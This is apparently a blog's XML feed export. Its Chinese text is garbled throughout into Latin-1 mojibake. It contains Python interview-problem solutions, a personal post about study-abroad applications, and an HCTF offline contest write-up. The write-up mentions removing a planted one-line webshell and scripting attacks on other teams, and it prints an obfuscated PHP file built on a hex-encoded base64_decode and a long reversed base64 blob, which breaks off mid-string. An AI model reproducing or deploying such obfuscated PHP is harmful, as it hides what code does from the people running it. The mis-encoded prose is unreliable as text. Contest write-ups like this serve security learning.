æ„Ÿè§‰æ˜¯é’ˆå¯¹cè¯­è¨€çš„,ç”¨pythonæ„Ÿè§‰ç®€å•ä¸å°‘,ä¸è¿‡ç»™å‡ºçš„æ ·ä¾‹è¿‡äº†ä½†æ˜¯æäº¤ä¹‹åç»“æœé”™è¯¯,ä¸æ˜¯å¾ˆç†è§£å“ªé‡Œå†™é”™äº†.</p><p>è¿™é‡Œç®€åŒ–ä¸€ä¸‹é—®é¢˜, ç»™å‡ºä¸€ä¸ªå­—å…¸, keyä¸ºç‰Œçš„å¤§å°, valueä¸ºæ­¤ç‰Œçš„æ•°é‡, æ¯æ‰¾åˆ°ä¸€ä¸ªåŒèŠ±é¡º, å­—å…¸ä¸­å¯¹åº”keyçš„value-1(å³ä¸æ”¾å›).</p><p>ç›®æ ‡ä¸ºæ‰¾å‡ºæ‰‹ç‰Œä¸­æœ€å¤§åŒèŠ±é¡ºæ•°é‡</p><p>ä¸ç¡®å®šå†™é”™æ²¡,è¿™é‡Œç›´æ¥å†™çš„æ£€æµ‹æ‰€æœ‰åŒèŠ±é¡ºçš„å‡½æ•° <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">flush</span>(<span class="params">dict1</span>):</span><br><span class="line">    found = <span class="number">1</span></span><br><span class="line">    flush_list = []</span><br><span class="line">    keys = []</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> dict1.items():</span><br><span class="line">        <span class="keyword">if</span> v &gt; <span class="number">0</span>:</span><br><span class="line">            keys.append(k)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> found == <span class="number">1</span>:</span><br><span class="line">        found = <span class="number">0</span></span><br><span class="line">        left = <span class="number">0</span></span><br><span class="line">        right = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> right &lt; <span class="built_in">len</span>(keys):</span><br><span class="line">            <span class="keyword">if</span> keys[right] - keys[left] == right - left:</span><br><span class="line">                right += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                left = right</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> right - left == <span class="number">5</span>:</span><br><span class="line">                found = <span class="number">1</span></span><br><span class="line">                flush_key = keys[left:right]</span><br><span class="line">                flush_list.append(flush_key)</span><br><span class="line">                <span class="keyword">for</span> key <span class="keyword">in</span> flush_key:</span><br><span class="line">                    dict1[key] -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                keys = []</span><br><span class="line">                <span class="keyword">for</span> k, v <span class="keyword">in</span> dict1.items():</span><br><span class="line">                    <span class="keyword">if</span> v &gt; <span class="number">0</span>:</span><br><span class="line">                        keys.append(k)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flush_list</span><br><span class="line"><span class="comment"># test = &#123;1:2, 2:2, 3:2, 4:3, 5:3, 6:3, 7:1, 8:1, 9:1, 10:1&#125;</span></span><br><span class="line"><span class="comment"># print(flush(test))</span></span><br><span class="line"><span class="comment"># [[1, 2, 3, 4, 5], [1, 2, 3, 4, 5], [4, 5, 6, 7, 8]]</span></span><br></pre></td></tr></table></figure></p><h2 id="å¥½æ•°ç»„">å¥½æ•°ç»„</h2><p>ç»™å‡ºä¸€ä¸ªé•¿åº¦ä¸ºnçš„æ•°ç»„, ç›®æ ‡æ˜¯è®©å…¶å˜æˆn-1ä¸”ä»…n-1ä¸ªå…ƒç´ ç›¸åŒçš„æ•°ç»„,å…·ä½“è®°å¾—ä¸å¤ªæ¸…äº†,æ ·ä¾‹å€’æ˜¯è®°å¾—ä¸€äº› è¾“å…¥: [1, 2, 2, 2, 5] è¾“å‡º: 1 è§£é‡Š: åªéœ€è¦å°†1å˜ä¸º2å³å¯</p><p>è¾“å…¥:[1, 1, 1] è¾“å‡º1: è§£é‡Š: å°†éšä¾¿ä¸€ä¸ª1å˜æˆ0æˆ–è€…2å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¥½æ•°ç»„</span></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">good_list</span>(<span class="params">lst</span>):</span><br><span class="line">    counter = Counter(lst)</span><br><span class="line">    keys = counter.keys()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(keys) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(keys) == <span class="number">2</span> <span class="keyword">and</span> (<span class="number">1</span> <span class="keyword">in</span> counter.values()):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    mean = <span class="keyword">lambda</span> x: <span class="built_in">sum</span>(x)/<span class="built_in">len</span>(x)</span><br><span class="line">    sorted_list = <span class="built_in">sorted</span>(lst)</span><br><span class="line">    mean_all = mean(sorted_list)</span><br><span class="line">    <span class="comment"># å»é™¤ä¸€ä¸ªæç«¯å€¼ç„¶åä¾æ®å¹³å‡æ•°æ¥ç§»åŠ¨</span></span><br><span class="line">    mean_without_last = mean(sorted_list[:-<span class="number">1</span>])</span><br><span class="line">    mean_without_first = mean(sorted_list[<span class="number">1</span>:])</span><br><span class="line">    <span class="comment"># å¯¹å¹³å‡æ•°å½±å“è¶Šå¤§è¯´æ˜è¶Šæç«¯</span></span><br><span class="line">    <span class="comment"># å»é™¤æœ€å¤§å€¼æ›´å¥½</span></span><br><span class="line">    <span class="keyword">if</span> mean_all - mean_without_last &gt; mean_without_first - mean_all:</span><br><span class="line">        <span class="comment"># å‘ä¸Šå–æ•´è¿˜æ˜¯å‘ä¸‹å–æ•´å–å†³äºä¸¤è¾¹å…ƒç´ çš„æ•°é‡,æœ€ç»ˆå–minå°±è¡Œ</span></span><br><span class="line">        target_floor = <span class="built_in">int</span>(mean_without_last)</span><br><span class="line">        target_ceil = target_floor + <span class="number">1</span></span><br><span class="line">        res_floor = <span class="number">0</span></span><br><span class="line">        res_ceil = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> sorted_list[:-<span class="number">1</span>]:</span><br><span class="line">            res_floor += <span class="built_in">abs</span>(target_floor - i)</span><br><span class="line">            res_ceil += <span class="built_in">abs</span>(target_ceil - i)</span><br><span class="line">    <span class="comment"># å»é™¤æœ€å°å€¼æ›´å¥½</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        target_floor = <span class="built_in">int</span>(mean_without_first)</span><br><span class="line">        target_ceil = target_floor + <span class="number">1</span></span><br><span class="line">        res_floor = <span class="number">0</span></span><br><span class="line">        res_ceil = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> sorted_list[<span class="number">1</span>:]:</span><br><span class="line">            res_floor += <span class="built_in">abs</span>(target_floor - i)</span><br><span class="line">            res_ceil += <span class="built_in">abs</span>(target_ceil - i)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">min</span>(res_ceil, res_floor)</span><br><span class="line"><span class="comment"># print(good_list([2,2,2,2,2,4,4,4,4,8,8,8,8,8,888]))</span></span><br><span class="line"><span class="comment"># output : 30</span></span><br><span class="line"><span class="comment"># to 2: 4 * 2 + 5 * 6 = 38</span></span><br><span class="line"><span class="comment"># to 4: 5 * 2 + 5 * 4 = 30</span></span><br><span class="line"><span class="comment"># to 8: 5 * 6 + 4 * 4 = 46</span></span><br></pre></td></tr></table></figure><h2 id="æœ€å¤§è¿ç»­å­ä¸²æƒé‡">æœ€å¤§è¿ç»­å­ä¸²æƒé‡</h2><p>å…·ä½“è®°ä¸å¤ªæ¸…äº†,æè¿°æœ‰ç‚¹é•¿. é¦–å…ˆå®šä¹‰è¿ç»­å­ä¸²æƒé‡: æ¯”å¦‚11000111 11, 000, 111åˆ†åˆ«æ˜¯ä¸‰ä¸ªæœ€å¤§è¿ç»­å­ä¸²,åˆ™è®°æƒé‡ä¸º3</p><p>ç„¶åè¦æ±‚è¾“å‡ºä¸€ä¸ªå­—ç¬¦ä¸²çš„æ‰€æœ‰å­ä¸²çš„æœ€å¤§è¿ç»­å­ä¸²æƒé‡. æ¯”å¦‚1101 1å…ƒç´ :1, 1, 0, 1. å…±è®¡4</p><p>2å…ƒç´ :11, 10, 01. 11è®°1, 10è®°2, 01è®°2</p><p>3å…ƒç´ :110, 101. 110è®°2, 101è®°3</p><p>4å…ƒç´ :1101. è®°3</p><p>æ‰€ä»¥æ€»æƒé‡ä¸º4+1+2+2+2+3+3 = 17,è¾“å‡º17</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æœ€å¤§è¿ç»­å­ä¸²æƒé‡</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">weight</span>(<span class="params">s</span>):</span><br><span class="line">    left = <span class="number">0</span></span><br><span class="line">    right = <span class="number">0</span></span><br><span class="line">    length = <span class="built_in">len</span>(s)</span><br><span class="line">    ret = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> right &lt; length:</span><br><span class="line">        <span class="keyword">if</span> s[left] == s[right]:</span><br><span class="line">            right += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            left = right</span><br><span class="line">            ret += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> ret + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_substring</span>(<span class="params">s</span>):</span><br><span class="line">    s_weight = <span class="number">0</span></span><br><span class="line">    lens = <span class="built_in">len</span>(s)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, lens + <span class="number">1</span>):</span><br><span class="line">        left = <span class="number">0</span></span><br><span class="line">        right = i</span><br><span class="line">        <span class="keyword">while</span> right &lt;= lens:</span><br><span class="line">            <span class="comment"># ret_lst = []</span></span><br><span class="line">            <span class="comment"># ret_lst.append(s[left:right])</span></span><br><span class="line">            s_weight += weight(s[left:right])</span><br><span class="line">            left += <span class="number">1</span></span><br><span class="line">            right += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s_weight</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(weight(&#x27;11000111&#x27;))</span></span><br><span class="line"><span class="comment"># should be 3</span></span><br><span class="line"><span class="comment"># 11, 000, 111</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(get_substring(&#x27;1101&#x27;))</span></span><br><span class="line"><span class="comment"># should be 17</span></span><br></pre></td></tr></table></figure><p>ä¸è¿‡æœ€åTLEäº†,åº”è¯¥è¿˜èƒ½ä¼˜åŒ–,æ¯”å¦‚<code>get_substring</code>å¸¦ä¸€ä¸ªå­—å…¸,æ¯ç®—å‡ºä¸€ä¸ªweightå…ˆæŸ¥è¯¢,æ²¡æœ‰çš„è¯å†è®¡ç®—ç„¶åæ›´æ–°,ç©ºé—´æ¢æ—¶é—´. ä¸è¿‡å½“æ—¶æ²¡ååº”è¿‡æ¥.</p>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å¤§å››</title>
      <link href="/2019/08/31/%E5%A4%A7%E5%9B%9B/"/>
      <url>/2019/08/31/%E5%A4%A7%E5%9B%9B/</url>
      
        <content type="html"><![CDATA[<p>åšå®¢æ”¾äº†è›®ä¹…ä¸€æ®µæ—¶é—´äº†,å‰ä¸€æ®µæ—¶é—´åˆæ˜¯è€ƒè¯•åˆæ˜¯é›…æ€çš„å¹¶æ²¡æœ‰å¤šå°‘æ—¶é—´ã€‚ä¸è¿‡è¿‘æœŸé›…æ€ç»ˆäºä¹Ÿç®—è€ƒè¿‡äº†,ç›¸å¯¹æ¥è¯´æœ‰é‚£ä¹ˆä¸€äº›ç©ºé—²æ—¶é—´äº†,æ¯”èµ›å¯èƒ½çš„è¯ä¹Ÿå¯ä»¥è·Ÿç€çœ‹ä¸€çœ‹äº†,ä¸è¿‡è‚¯å®šå¾—å»ºç«‹åœ¨ç”³è¯·æ²¡ä»€ä¹ˆå¤§é—®é¢˜çš„åŸºç¡€ä¸Šäº†. ç”³è¯·é—®é¢˜ä¸»è¦æ˜¯GREå’ŒAPSä¸¤ä¸ªéƒ¨åˆ† GREä¸»è¦æ˜¯NUSé‚£è¾¹éœ€è¦,ç›®å‰çœ‹æ¥GREçš„è¯æ±‡æˆ‘è¿˜ç¡®å®ä¸å¤ªè¶³,è¿™ä¸€éƒ¨åˆ†éœ€è¦æ…¢æ…¢è¡¥,åŠ ä¸ŠNUSç”³è¯·æœŸå¿«æˆªè‡³äº†,å¦‚æœå‡†å¤‡GREçš„è¯é‚£å¤§æ¦‚å°±åªèƒ½æ˜¥å­£ç”³è¯·äº†,ä¸è¿‡ç¼ºç‚¹å°±æ˜¯é‚£ä¸ªæ—¶å€™å¯èƒ½é¢ä¸´å¤§æ‰¹ç ”åå‡ºå›½çš„äººä¸€èµ·,ç«äº‰å‹åŠ›å¤§. è€ŒAPSåˆ™æ˜¯å¾·å›½é‚£è¾¹éœ€è¦,ä¸“ä¸šåŒ¹é…åº¦æˆ‘å€’æ˜¯ä¸é‚£ä¹ˆæ‹…å¿ƒ,ä¸è¿‡å› ä¸ºAPSå®¡æ ¸æ—¶é—´ä¸ç¡®å®š,ä¸€èˆ¬éœ€è¦ä¸‰ä¸ªæœˆæ—¶é—´æ¥å‡†å¤‡ã€‚å¤ä¹ ã€ç¿»è¯‘ã€é¢è¯•å‡†å¤‡çš„æ—¶é—´å…¶å®å¹¶ä¸å……è£•,ä¸“æœ‰åè¯è§£é‡Šç¿»è¯‘,æ•°å­¦çš„å¤ä¹ ä¹‹ç±»çš„å®é™…ä¸Šä¹Ÿéœ€è¦å¤§é‡æ—¶é—´ã€‚ è‡³äºé¢è¯•èµ„æ–™å¡«å†™æ¨èä¿¡ä»€ä¹ˆçš„ä¹Ÿæ˜¯å¾—å¼„å¥½è¿™äº›å¿…é¡»è¦æ±‚ä¹‹åå†å»è€ƒè™‘çš„,ä¸ç®¡æ€ä¹ˆè¯´,èµ°ä¸€æ­¥çœ‹ä¸€æ­¥å§,åç»­æœ‰äº‹æƒ…å†ç»§ç»­æ›´æ–°å§.</p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hctfçº¿ä¸‹</title>
      <link href="/2018/12/19/hctf%E7%BA%BF%E4%B8%8B/"/>
      <url>/2018/12/19/hctf%E7%BA%BF%E4%B8%8B/</url>
      
        <content type="html"><![CDATA[<p>ç¬¬ä¸€æ¬¡æ‰“çº¿ä¸‹,è™½ç„¶æå‰å‡†å¤‡äº†ä¸€äº›ä¸œè¥¿,ä½†è¿˜æ˜¯å¤ªèœäº†,ç®€å•è®°å½•ä¸€ä¸‹å§</p><h1 id="ç¬¬ä¸€å¤©çš„é¢˜">ç¬¬ä¸€å¤©çš„é¢˜</h1><h2 id="é¢„ç•™åé—¨">é¢„ç•™åé—¨</h2><p>æ‹¿åˆ°sshä¹‹åè¿ä¸Šå»æ‰“åŒ…ä¸€ä»½<code>www.tar.gz</code>è®©é˜Ÿå‹ä¸‹ä¸‹æ¥dç›¾æ‰«äº†ä¸€ä¸‹ å‘ç°/workdir/config/emmm_version.phpé‡Œé¢å­˜åœ¨ä¸€å¥è¯ åˆ æ‰ä¸€å¥è¯å¹¶å†™æ‰“å…¨åœºè„šæœ¬,è™½ç„¶å¾ˆå¤šé˜Ÿåˆ æ‰äº†,ä½†æ˜¯è¿˜æœ‰å¯ä»¥æ‹¿ä¸€äº›é˜Ÿçš„åˆ†æ•°</p><h2 id="åˆ†æåé—¨å…¶å®ä¸æ˜¯">åˆ†æåé—¨(å…¶å®ä¸æ˜¯</h2><p>é™¤äº†å‰é¢è¯´åˆ°çš„åé—¨,dç›¾è¿˜æ‰«å‡ºæ¥ä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„ä¸œè¥¿ æ¯”å¦‚client/manage/emmm_userwebzz.php <a href="/images/2018/12/2018-12-17-15-21-33-åˆ›å»ºçš„æˆªå›¾.png"><img src="/images/2018/12/2018-12-17-15-21-33-åˆ›å»ºçš„æˆªå›¾.png" /></a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$OOOOOOO0</span> = <span class="string">&quot;\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65&quot;</span>;</span><br><span class="line"><span class="variable">$OOOOO0OO</span> = <span class="string">&quot;=0nC7IXZ39GctVGJg4mc1RXZylgC9lgC9lQCKsTKJkQCKwyJ+YXak9CP+UGbiFGdvwjPyR3L84DZ09CP+QHcpJ3Yz9CP+ISN9QWaiZycq1DZv12PwhGcukGch9iY1x2YvQXZu5Sbt1WZuc3d39yL6AHd0hmI9MmczBiI0BXayN2chZXYq9Cd4VGdi0TZwlHdgQHcpJ3YzxjPlxWe0N3L803MzMzI6I3bs92Y7FGIpxGIsVHIlxWdk9Wbu03QDN0I6I3bs92Y7gHcyIjO0h2ZpVGatUmbpx2O4BnMyoDdodWalh2epxGIsVHIlxWdk9Wbu4jIzN3YvQHelRnI9UGc5RHIlxWe0NHP+ICcvRnI942ZpxWY2BiIlQTNi0Da0RWa3BCZ0xjPkR3L84TZsJWY09CP+IHdvwjPkR3L84TYvwTv9i+i4Sut7SukPauPismbhxmYfJSP0V2ZyFGdgIyNz0DZpZmJ5FGbwNXak1Wdy9mZ9Q2bt9DcoBnLtVncvZ2LiVHbj9Cdl5mLt1Wbl9yL6AHd0hmI9YWZyhGIhxDItAiPh9CP92L6LiL5/2p5hiq5+IyauFGbi9lI9QXZnJXY0BiI2MTPklmZmkXYsB3cpRWb1J3bm1DZv12PwhGcu0Wdy9mZvIWdsN2L0Vmbu0WbtV2LvoDc0RHai0jZlJHagEGPg0CI+E2L8gopp34jljpop76lp7jIr5WYsJ2Xi0DdldmchRHIiITPklmZmkXYsB3cpRWb1J3bm1DZv12PwhGcu0Wdy9mZvIWdsN2L0Vmbu0WbtV2LvoDc0RHai0jZlJHagEGP+QGd84DZ09CP+YXak9CPay77l6o5+OZ6zWY54u55+ICdodWayJSPudWasFGI2lGZ84DZ0xjPyRHP+IHdvwjPkR3L88Jql/IslHIgjXotoXotoHIgj/YupfKpl7DZ0xjPkR3L84jdpR2L8oJvvjZklDJim/JmpL6mlH5jlDIvl7jI0h2ZpJnI942ZpxWYgYXakxjPkRHP+IHd84jc09CP+QGdvwzn8S+kZaOkUWuPkRHP+QGdvwjP2lGZvwjm8+uu6S+o0i+n0iurbeeuhmuPiQHanlmci0jbnlGbhBidpRGP+QGd84jc0xjPyR3L84DZ09CP+E2L801iceepfa+W+ISKoc2bsFWakpDdwlmcjNXY2Fmai0jZlJHagEGP7A3ci5mJ7A3ci5mJ7A3ci5mJ7A3ci5mJzkTM4cDMSNVNxAjM+QGd84DZ09CP+YXak9CPay77mmL5B+K6piY5TiL5+ICdodWayJSPudWasFGI2lGZ84DZ0xjPyRHP+IHdvwjPkR3L8MVTDB1TBC44T10Q+Sr5yKY5BC44+Sr5yKY5+QGd84DZ09CP+YXak9CPay77we65NCZ5oS554ib5D6a52WY52uL5v2L6+ICdodWayJSPudWasFGI2lGZ84DZ0xjPyRHP+IHdvwjPkR3L80WbtVmPkRHP+QGdvwjP2lGZvwjm8+OsneejQWut7S+r9iuPiQHanlmci0jbnlGbhBidpRGP+QGd84jc0xjPyR3L84DZ09CP+E2L8g7jlzahlDZmpnInmDoimH5pnDJim/Jvkj6umTJslj4kl7jIr5WYsJ2Xi0DdldmchRHIiQXZu5Sbt1WZuc3d39yL6AHd0hmI9YWZyhGIhxjPkRHP+QGdvwjP2lGZvwjm8+ekPWOg8Wut7S+r9iuPiQHanlmci0jbnlGbhBidpRGP+QGd84jc0xjPiUjI9cmbpRGZhBHbsV2YgICMi0jclRmcvJGIiUCMwEjI9gGdkl2dgUGbiFGd84jIklGbvNHIDN0QjACewFjO0h2ZpJXLyVGZy9mYi0TZslHdzBiIlYDNi0Da0RWa3BCZ0xjPyRHP+ICMxISPn5WakRWYwxGblNGIiAjI9IXZkJ3biBiIlADMxISPoRHZpdHIlxmYhRHP+YXak9CP+ICa09mY6IXYlx2Yi0TZslHdzBidpRGP+EDavwTKCC446S65+ip5oyZ5NiL5GCb5vGo5h+L5k2q5My77Im45D2p5I6o5wmL5tSL6osDczJmbm8agmH6vkPYnmjYin7TMoxjPiMTY0FGZf1WbtVmI9M3chx2YgYXakxjP2lGZvwjPigHcwUjO0h2ZpVGa7gGdvJmOyFWZsNmI9UGb5R3cgYXakxzJ+0zJ0h2ZpJncld3bw1WZnkQCJkgCsciPpx2L84TYvwTv9i+i4Sut7SukPauPismbhxmYfJSP0V2ZyFGdgIyNz0DZpZmJ5FGbwNXak1Wdy9mZ9Q2bt9DcoBnLtVncvZ2LiVHbj9Cdl5mLt1Wbl9yL6AHd0hmI9YWZyhGIhxjPpxGP+kGbvwjPh9CP92L6LiL5/2p5hiq5+IyauFGbi9lI9QXZnJXY0BiI2MTPklmZmkXYsB3cpRWb1J3bm1DZv12PwhGcu0Wdy9mZvIWdsN2L0Vmbu0WbtV2LvoDc0RHai0jZlJHagEGP+kGb84Tas9CP+E2L8sZnlrrro/KnmDoim7jIr5WYsJ2Xi0DdldmchRHIiIWdsN2L0Vmbu0WbtVmL3d3dv8iOwRHdoJSPmVmcoBSY84TasxjPpx2L84TYvwTmreek9eeuWaOmuWuPismbhxmYfJSP0V2ZyFGdgICdl5mLt1Wbl5yd3d3LvoDc0RHai0jZlJHagEGP+kGb84Tas9CP+E2L84Ddu9mZvwzgdaOiOaut7S+r9iuPiADMwAjRGNiI9I3bs92YgQnbvZGP+IibpFWbi0DdldmchRHIiAHaw5yctNGcv9Vbt1WZvciLddCa0FGculWbkF2Jb1WbtVGJuciI9YWZyhGIhxjPpxGPnAiP9AyJ6Jmcld3bw1WZnkQCJkgCsciP2lGZvwjPh9CPh0WbtVmPismbhxmYfJSP0V2ZyFGdgICdl5mLt1Wbl5yd3d3LvoDc0RHai0jZlJHagEGPgknYgQWZyV2dvBlPisDewBjM6QHanlmctcmbpRGZhBHI7gHcwMjO0h2ZpVGatUmbpxGI7QHanlmc6QXYvxmZi0TZslHdzBidpRGPnAiP9AyJyV2dvBXbldSCJkQCKwyJ+YXak9CP4+Y5sWY5QmZ6Jyp5Aqo5Re65Qio5fyL5our5UCb5IOZ57A3ci5mJ7A3ci5mJsciLpcSWngSZ0FGZucyOwNnYuZyOwNnYuZSKjhyOwNnYuZyOwNnYuZiPh9CPh0WbtVmPismbhxmYfJSP0V2ZyFGdgICdl5mLt1Wbl5yd3d3LvoDc0RHai0jZlJHagEGPgknYgQWZyV2dvBlPiQHanlmc5B3bDJSPklGI2lGZ8cCI+0DIn4Wan9GbyV2dvBXbldSCJkQCKgSehJnchBSPgIXZ39GctVGJJkQCKsXZzxWZ9lQCKsTKncCI+0DInQHanlmcyV2dvBXbldCLncCI+0DInonYyV2dvBXbldCLncCI+0DInIXZ39GctV2JscyJg4TPgcibpd2bsJXZ39GctV2JokXYyJXYg0DIyV2dvBXblRSCJkgC7liI0QjZhhjZ0QWN5ICI90DIw8GMw8GMPBzTf1WbtVGJoYWaJkgC7V2csVWfJowOpkQCKwyJ+YXak9CP+UGbiFGdvwjPyR3L84DZ09CP+QHcpJ3Yz9CP+ISN9QWaiZycq1DZv12PwhGcukGch9iY1x2YvQXZu5Sbt1WZuc3d39yL6AHd0hmI9MmczBiI0BXayN2chZXYq9Cd4VGdi0TZwlHdgQHcpJ3YzxjPlxWe0N3L803MzMzI6I3bs92Y7FGIpxGIsVHIlxWdk9Wbu03QDN0I6I3bs92Y7gHcyIjO0h2ZpVGatUmbpx2O4BnMyoDdodWalh2epxGIsVHIlxWdk9Wbu4jIzN3YvQHelRnI9UGc5RHIlxWe0NHP+ICcvRnI942ZpxWY2BiIlQTNi0Da0RWa3BCZ0xjPkR3L84TZsJWY09CP+IHdvwjPkR3L84TYvwTv9i+i4Sut7SukPauPismbhxmYfJSP0V2ZyFGdgIyNz0DZpZmJ5FGbwNXak1Wdy9mZ9Q2bt9DcoBnLtVncvZ2LiVHbj9Cdl5mLt1Wbl9yL6AHd0hmI9YWZyhGIhxDItAiPh9CP92L6LiL5/2p5hiq5+IyauFGbi9lI9QXZnJXY0BiI2MTPklmZmkXYsB3cpRWb1J3bm1DZv12PwhGcu0Wdy9mZvIWdsN2L0Vmbu0WbtV2LvoDc0RHai0jZlJHagEGPg0CI+E2L8gopp34jljpop76lp7jIr5WYsJ2Xi0DdldmchRHIiITPklmZmkXYsB3cpRWb1J3bm1DZv12PwhGcu0Wdy9mZvIWdsN2L0Vmbu0WbtV2LvoDc0RHai0jZlJHagEGP+QGd84DZ09CP+YXak9CPay77l6o5+OZ6zWY54u55+ICdodWayJSPudWasFGI2lGZ84DZ0xjPyRHP+IHdvwjPkR3L88Jql/IslHIgjXotoXotoHIgj/YupfKpl7DZ0xjPkR3L84jdpR2L8oJvvjZklDJim/JmpL6mlH5jlDIvl7jI0h2ZpJnI942ZpxWYgYXakxjPkRHP+IHd84jc09CP+QGdvwzn8S+kZaOkUWuPkRHP+QGdvwjP2lGZvwjm8+uu6S+o0i+n0iurbeeuhmuPiQHanlmci0jbnlGbhBidpRGP+QGd84jc0xjPyR3L84DZ09CP+E2L801iceepfa+W+ISKoc2bsFWakpDdwlmcjNXY2Fmai0jZlJHagEGP7A3ci5mJ7A3ci5mJ7A3ci5mJ7A3ci5mJzkTM4cDMSNVNxAjM+QGd84DZ09CP+YXak9CPay77mmL5B+K6piY5TiL5+ICdodWayJSPudWasFGI2lGZ84DZ0xjPyRHP+IHdvwjPkR3L8MVTDB1TBC44T10Q+Sr5yKY5BC44+Sr5yKY5+QGd84DZ09CP+YXak9CPay77we65NCZ5oS554ib5D6a52WY52uL5v2L6+ICdodWayJSPudWasFGI2lGZ84DZ0xjPyRHP+IHdvwjPkR3L80WbtVmPkRHP+QGdvwjP2lGZvwjm8+OsneejQWut7S+r9iuPiQHanlmci0jbnlGbhBidpRGP+QGd84jc0xjPyR3L84DZ09CP+E2L8g7jlzahlDZmpnInmDoimH5pnDJim/Jvkj6umTJslj4kl7jIr5WYsJ2Xi0DdldmchRHIiQXZu5Sbt1WZuc3d39yL6AHd0hmI9YWZyhGIhxjPkRHP+QGdvwjP2lGZvwjm8+ekPWOg8Wut7S+r9iuPiQHanlmci0jbnlGbhBidpRGP+QGd84jc0xjPiUjI9cmbpRGZhBHbsV2YgICMi0jclRmcvJGIiUCMwEjI9gGdkl2dgUGbiFGd84jIklGbvNHIDN0QjACewFjO0h2ZpJXLyVGZy9mYi0TZslHdzBiIlYDNi0Da0RWa3BCZ0xjPyRHP+ICMxISPn5WakRWYwxGblNGIiAjI9IXZkJ3biBiIlADMxISPoRHZpdHIlxmYhRHP+YXak